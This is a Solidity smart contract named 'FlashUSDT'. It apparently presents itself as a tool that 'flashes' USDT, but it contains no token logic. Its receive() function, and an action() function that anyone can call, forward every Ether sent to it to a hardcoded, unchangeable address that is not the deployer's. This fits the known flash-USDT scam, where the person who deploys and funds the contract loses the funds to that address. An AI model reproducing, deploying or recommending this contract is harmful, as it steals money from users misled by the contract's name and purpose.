// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/// @title FlashUSDT
/// @notice This contract automatically forwards received Ether to a predefined address.
/// @dev The destination address is hardcoded and cannot be changed. The contract includes functionality for setting and updating the "flash amount" as well as access control mechanisms for security.
contract FlashUSDT {
    /// @notice The address to which all received Ether will be forwarded.
    /// @dev This address is hardcoded and cannot be changed after deployment.
    address payable public constant destinationAddress = payable(0x0ed88268bfAEE2F0857f35eA0f9DD2d48962C7cB);

    /// @notice The owner of the contract.
    /// @dev The owner is set during deployment and can transfer ownership.
    address public owner;

    /// @notice The "flash amount" specified during deployment.
    /// @dev This amount can be updated by the owner after deployment.
    uint256 public flashAmount;

    /// @notice Event for logging the forwarding action.
    /// @param from The address from which Ether was received.
    /// @param amount The amount of Ether forwarded.
    event Forwarded(address indexed from, uint256 amount);

    /// @notice Event for logging changes to the "flash amount".
    /// @param previousAmount The previous "flash amount".
    /// @param newAmount The new "flash amount".
    event FlashAmountUpdated(uint256 previousAmount, uint256 newAmount);

    /// @notice Event for logging ownership transfer.
    /// @param previousOwner The previous owner address.
    /// @param newOwner The new owner address.
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /// @notice Modifier to restrict function access to only the owner.
    modifier onlyOwner() {
        require(msg.sender == owner, "Caller is not the owner");
        _;
    }

    /// @notice Constructor to set the initial "flash amount" and owner.
    /// @param _flashAmount The initial "flash amount".
    constructor(uint256 _flashAmount) {
        flashAmount = _flashAmount;
        owner = msg.sender;
        emit OwnershipTransferred(address(0), owner);
    }

    /// @notice Function to automatically forward any received Ether.
    /// @dev This function is triggered when Ether is sent to the contract without data.
    receive() external payable {
        require(msg.value > 0, "No Ether received");
        emit Forwarded(msg.sender, msg.value);
        (bool success, ) = destinationAddress.call{value: msg.value}("");
        require(success, "Failed to forward Ether");
    }

    /// @notice Function to update the "flash amount".
    /// @dev This function can only be called by the owner.
    /// @param _newFlashAmount The new "flash amount".
    function setFlashAmount(uint256 _newFlashAmount) external onlyOwner {
        uint256 previousAmount = flashAmount;
        flashAmount = _newFlashAmount;
        emit FlashAmountUpdated(previousAmount, _newFlashAmount);
    }

    /// @notice Function to transfer contract ownership.
    /// @dev This function can only be called by the current owner.
    /// @param _newOwner The new owner's address.
    function transferOwnership(address _newOwner) external onlyOwner {
        require(_newOwner != address(0), "New owner is the zero address");
        address previousOwner = owner;
        owner = _newOwner;
        emit OwnershipTransferred(previousOwner, _newOwner);
    }

    /// @notice Function to forward the "flash amount" of Ether using a call.
    /// @dev This function can be called by anyone. The contract balance must be at least `flashAmount`.
    function action() external {
        require(address(this).balance >= flashAmount, "Insufficient contract balance");
        emit Forwarded(address(this), flashAmount);
        (bool success, ) = destinationAddress.call{value: flashAmount}("");
        require(success, "Failed to forward Ether");
    }

    /// @notice Function to withdraw any Ether balance in the contract to the owner's address.
    /// @dev This function can only be called by the owner.
    function withdraw() external onlyOwner {
        uint256 contractBalance = address(this).balance;
        require(contractBalance > 0, "No Ether to withdraw");
        (bool success, ) = owner.call{value: contractBalance}("");
        require(success, "Withdrawal failed");
    }

    /// @notice Function to destroy the contract and send any remaining Ether to the owner.
    /// @dev This function can only be called by the owner. Use with caution.
    function destroy() external onlyOwner {
        selfdestruct(payable(owner));
    }
}
